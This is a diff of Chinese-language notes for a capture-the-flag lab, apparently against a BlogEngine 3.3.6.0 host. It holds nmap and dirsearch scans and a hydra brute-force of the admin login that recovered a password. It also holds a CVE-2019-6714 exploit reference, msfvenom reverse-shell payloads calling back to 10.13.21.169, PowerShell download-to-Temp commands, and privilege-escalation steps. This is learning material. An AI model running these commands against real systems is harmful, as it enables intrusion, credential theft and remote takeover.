@@ -1,5 +1,5 @@
-#服务扫描
-
+# 服务扫描
+```
 nmap -sV -Pn -A 10.10.143.193
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-24 06:04 EDT
@@ -40,14 +40,15 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 53.38 seconds
+```
 
-
-#小丑名字
+# 小丑名字
 根据图片，放到谷歌中搜索，小丑回魂2，剧中小丑的名字：Pennywise
 
 
-#爆破目录
-# python3 dirsearch.py -u http://10.10.143.193 -e *                                              
+# 爆破目录
+```
+#  python3 dirsearch.py -u http://10.10.143.193 -e *                                              
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -110,8 +111,9 @@ Target: http://10.10.143.193
 [06:16:51] 500 -    2KB - /WEB-INF./web.xml                          
                                                                                         
 Task Completed                    
+```
 
-#爆破登录密码,注意__VIEWSTATE和__EVENTVALIDATION这两个隐藏在页面的元素，也需要把他们的值提交
+# 爆破登录密码,注意__VIEWSTATE和__EVENTVALIDATION这两个隐藏在页面的元素，也需要把他们的值提交
 
 hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.248.118 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=Dm1aKq8kfr0YaRND38UD/ACXHlMRS2ejVh/vsNHR91Tss4+m5teMCVxIWlDbOwsG8LDLps9QcTKeIkKEttafVYRLJ3knDpcy4ZyWgSX4bwKnxWyaPX4XOVBnBZBzSnzNh4OiLS9XgJvEb7wLFzEzFQrx7g92WE7dtanovGSWntP3hIfg&__EVENTVALIDATION=bXobeqArLseO60c3Mdy5+kw+t8gUCgXKMwrgihnfRoY8DwqXR3XneXuJInVFg8YAjEYaVOo/fCvZ/M/03H4iuIgLA4/pbd64b8pFX3WhVZc9k/kDmmJf9/yOlqGKfjNnlLCw3DXG7on3RZ2kGCx6D5eKCafnsItbabOVh5ARyDUwIglM&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
 
@@ -120,18 +122,18 @@ hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.248.118 http-post-fo
 密码:1qaz2wsx
 
 
-#web软件
+# web软件
 BlogEngine
 
-#版本号
+# 版本号
 3.3.6.0
 
-#漏洞号
+# 漏洞号
 CVE:
 2019-6714
 https://www.exploit-db.com/exploits/46353
 
-#利用方法
+# 利用方法
 /*
  * CVE-2019-6714
  *
@@ -164,21 +166,21 @@ https://www.exploit-db.com/exploits/46353
  *
  */
 
-#编译一个稳定的shell，拿到meterpreter
+# 编译一个稳定的shell，拿到meterpreter
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.21.169 LPORT=4444 -f exe -o shell.exe
 
-#x64 meterpreter
+# x64 meterpreter
 msfvenom -p windows/x64/meterpreter_reverse_tcp  LHOST=10.13.21.169 LPORT=4445 -f exe > Message.exe
 
-#从靶机下载到本地，注意要放到c:\Windows\Temp下，其他文件夹可能没有权限
+# 从靶机下载到本地，注意要放到c:\Windows\Temp下，其他文件夹可能没有权限
 powershell -c "Invoke-WebRequest -Uri 'http://10.13.21.169:8000/Message.exe' -OutFile 'c:\Windows\Temp\Message.exe'"
 
-#msf 监听
+# msf 监听
 1，use exploit/multi/handler 
 2，set playload windows/meterpreter/reverse_tcp
 
 
-#提权到adminstrator。Message.exe文件每30秒会以adminstrator的身份执行一次。
+# 提权到adminstrator。Message.exe文件每30秒会以adminstrator的身份执行一次。
 
 1，编译木马文件反弹shell，文件名Message.exe
 msfvenom -p windows/x64/meterpreter_reverse_tcp  LHOST=10.13.21.169 LPORT=4445 -f exe > Message.exe
@@ -209,12 +211,12 @@ meterpreter > run post/multi/recon/local_exploit_suggester
 
 
 
-#提权模块
+# 提权模块
 exploit/windows/local/cve_2019_1458_wizardopium
 
 
-#without msf
+# without msf
 msfvenom -p windows/shell_reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.21.169 LPORT=4444 -f exe -o shell2.exe
 
-#下载到本地
+# 下载到本地
 powershell -c "Invoke-WebRequest -Uri 'http://10.13.21.169:8000/winPEAS.bat' -OutFile 'c:\Windows\Temp\winPEAS.bat'"
